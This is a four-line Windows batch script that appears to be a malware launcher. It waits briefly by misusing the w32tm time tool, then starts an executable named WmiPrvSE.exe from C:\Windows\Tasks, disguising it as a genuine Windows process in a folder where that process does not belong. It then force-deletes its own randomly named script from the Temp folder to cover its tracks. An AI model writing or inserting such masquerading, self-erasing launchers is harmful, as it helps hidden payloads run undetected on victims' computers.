@echo off
w32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2  1>nul
start "" "C:\Windows\Tasks\WmiPrvSE.exe"
del /a /q /f "C:\Users\Admin\AppData\Local\Temp\\agLgmjaLqi.bat"